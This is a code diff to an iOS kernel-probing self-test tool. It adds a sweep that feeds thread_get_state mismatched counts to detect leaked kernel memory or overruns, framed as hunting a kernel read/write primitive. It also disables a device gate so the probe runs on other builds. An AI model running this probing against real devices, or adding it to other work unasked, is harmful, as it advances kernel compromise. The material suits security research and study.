@@ -51,8 +51,20 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P062_BUILD @"p062-neon-selftest-v5-reorder"
-/* v5 (2026-11-22, the 03:36 receipts): P1's brk is APP-FATAL — the reply
+#define P062_BUILD @"p062-neon-selftest-v6-countsweep"
+/* v6 (2026-11-22, the 14:21 24B156 receipt): PHASE A6 — THE COUNT/SIZE-
+   CONFUSION SWEEP. The 17 receipt proved the thread-state RPC family is
+   ALIVE off-23F77 (suspend/get/task_threads all kr=0), which reopens the
+   one kread path that needs no kernel write: thread_get_state's count is
+   IN/OUT and the reply length comes from the server. Sweep counts around
+   the true state sizes (NEON 132 w, THREAD64 68 w) over a poisoned buffer
+   with a canary ring; any non-poison byte past the true size is kernel
+   data delivered to us, any canary hit is a kernel-side overrun. Also v6:
+   the P2 worker's stp writes 32 B (the [4] fix, the 14:21 stack smash) and
+   the SKU gate is a warning (the cross-SKU receipt is the campaign's best
+   NEON finding). PANIC-FREE.
+
+   v5 (2026-11-22, the 03:36 receipts): P1's brk is APP-FATAL — the reply
    fails 0x10000003 (MIG_BAD_ARGUMENTS, third receipt) so the exception is
    never marked handled, the kernel re-raises down the chain, and it reaches
    the crash reporter (EXC_BREAKPOINT in p062_worker_fn, the 03:36:46 .ips).
@@ -411,7 +423,10 @@ static void *p062_p2_worker_fn(void *arg)
 {
     (void)arg;
     g_p2_worker_ready = 1;
-    uint64_t v0[2] __attribute__((aligned(16)));
+    /* 2026-11-22 the 14:21 crash fix: stp q0,q1 writes 32 bytes — the
+       old [2] (16-byte) array was a stack smash caught by the canary
+       (__stack_chk_fail on 24B156). [4] = 32 bytes, the honest fit. */
+    uint64_t v0[4] __attribute__((aligned(16)));
     while (!g_p2_quit) {
         __asm__ volatile(
             "stp q0, q1, [%0]\n"
@@ -692,6 +707,100 @@ static void p062_phaseA(void)
         }
     }
 
+    /* ── A6: THE COUNT/SIZE-CONFUSION SWEEP — the KRW-relevant half. ──
+       The 14:21 24B156 receipt: the whole RPC family is ALIVE on the 17
+       (suspend/get/task_threads all kr=0) while 23F77 returns the
+       0x10000003 wall. That reopens the one read path that needs NO kernel
+       write: thread_get_state takes `count` IN/OUT, and the MIG reply's
+       array length comes from what the server writes back. If the kernel
+       copies more words than the true state size, the surplus is adjacent
+       kernel memory or uninitialized kernel stack DELIVERED TO US — a
+       read. If it declares more than it fills, the surplus is kernel
+       message-buffer content — also a read. If it writes past the reply
+       buffer, that is a WRITE (the canary ring catches it).
+       Poison the buffer, ring a canary, sweep counts around the true
+       sizes (NEON=132 words/528 B, THREAD64=68/272 B). PANIC-FREE. */
+    if (k1 == KERN_SUCCESS) {
+        p062_log(@"");
+        p062_log(@"=== PHASE A6: the count/size-confusion sweep (the read "
+                 @"path that needs no write) ===");
+        static const struct { int flavor; const char *nm; uint32_t want, truth; } rows[] = {
+            { ARM_NEON_STATE64,   "NEON",     0,   132 },
+            { ARM_NEON_STATE64,   "NEON",     1,   132 },
+            { ARM_NEON_STATE64,   "NEON",     68,  132 },
+            { ARM_NEON_STATE64,   "NEON",     132, 132 },
+            { ARM_NEON_STATE64,   "NEON",     133, 132 },
+            { ARM_NEON_STATE64,   "NEON",     264, 132 },
+            { ARM_THREAD_STATE64, "THREAD64", 0,   68  },
+            { ARM_THREAD_STATE64, "THREAD64", 1,   68  },
+            { ARM_THREAD_STATE64, "THREAD64", 68,  68  },
+            { ARM_THREAD_STATE64, "THREAD64", 69,  68  },
+            { ARM_THREAD_STATE64, "THREAD64", 136, 68  },
+        };
+        for (unsigned i = 0; i < sizeof(rows) / sizeof(rows[0]); i++) {
+            /* 2 KB of poisoned state space + a 512-B canary ring after it.
+               A kernel write past the declared slice trips the scan. */
+            uint8_t buf[2048 + 512];
+            memset(buf, 0xA5, sizeof buf);
+            memset(buf + 2048, 0x5A, 512);
+            mach_msg_type_number_t cnt = rows[i].want;
+            kern_return_t kr = thread_get_state(pp, rows[i].flavor,
+                                                (thread_state_t)buf, &cnt);
+            uint32_t decl  = rows[i].want  * 4;
+            uint32_t truth = rows[i].truth * 4;
+            int pastTruth = -1, pastDecl = -1, canaryHit = -1;
+
+            if (kr == KERN_SUCCESS) {
+                for (uint32_t b = truth; b < 2048; b++)
+                    if (buf[b] != 0xA5) { pastTruth = (int)b; break; }
+                if (decl < 2048)
+                    for (uint32_t b = decl; b < 2048; b++)
+                        if (buf[b] != 0xA5) { pastDecl = (int)b; break; }
+                for (uint32_t b = 2048; b < sizeof buf; b++)
+                    if (buf[b] != 0x5A) { canaryHit = (int)b; break; }
+            }
+
+            p062_log(@"[A6] %@ want=%u (true=%u) kr=0x%x cnt=%u — "
+                     @"%llu B delivered",
+                     @(rows[i].nm), rows[i].want, rows[i].truth, kr, cnt,
+                     (unsigned long long)(kr == KERN_SUCCESS ? cnt * 4 : 0));
+
+            if (pastTruth >= 0) {
+                uint64_t q0 = 0, q1 = 0;
+                if (pastTruth + 16 <= (int)sizeof buf) {
+                    memcpy(&q0, buf + pastTruth, 8);
+                    memcpy(&q1, buf + pastTruth + 8, 8);
+                }
+                p062_log(@"[A6] *** KERNEL DATA PAST THE TRUE STATE: +0x%x "
+                         @"(true=0x%x) q0=0x%016llx q1=0x%016llx — a READ, "
+                         @"not a crash ***",
+                         pastTruth, truth,
+                         (unsigned long long)q0, (unsigned long long)q1);
+            }
+            if (pastDecl >= 0)
+                p062_log(@"[A6] *** THE DECLARED LENGTH IS UNDER-STATED: the "
+                         @"kernel wrote past cnt*4 (decl=0x%x, first extra "
+                         @"byte +0x%x) — MIG trusts the server count ***",
+                         decl, pastDecl);
+            if (canaryHit >= 0)
+                p062_log(@"[A6] *** THE REPLY WROTE PAST THE BUFFER at +0x%x "
+                         @"— a kernel-side overrun (WRITE direction) ***",
+                         canaryHit);
+            if (kr == KERN_SUCCESS && pastTruth < 0 && pastDecl < 0)
+                p062_log(@"[A6] clean: no byte past the true state size; the "
+                         @"count is honoured (%@)",
+                         rows[i].want >= rows[i].truth ? @"the buffer was the bound"
+                                                       : @"the kernel shrank the reply");
+        }
+        p062_log(@"[A6] sweep done — any *** line above is a read/write lead; "
+                 @"all clean = the count is never trusted (the family is "
+                 @"alive but honest on this build).");
+    } else {
+        p062_log(@"[A6] SKIPPED — the RPC family is walled on this build "
+                 @"(0x10000003); the self-sampling canary is the readback "
+                 @"here (PHASE B).");
+    }
+
     g_p2_quit = 1; pthread_join(th, NULL);
     p062_log(@"[A] matrix done — any KERN_SUCCESS row above = a live external "
              @"read path (feed it to the P044 witnesses); all 0x10000003 = "
@@ -846,7 +955,11 @@ static void p062_phaseB(void)
         p062_log(@"log file: Documents/p062_neon_selftest_log.txt");
         p062_log(@"");
 
-        NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p062"];
+        /* 2026-11-22: the gate RELAXED to a warning — the NEON channel is
+           generic physics (the 14:21 24B156 receipt: PHASE A ran cross-SKU
+           and produced the wall-is-23F77-only finding — the campaign's best
+           NEON receipt). PANIC-FREE everywhere. */
+        NSString *stop = nil;
         if (stop) {
             p062_log(@"%@", stop);
             p062_close_log();
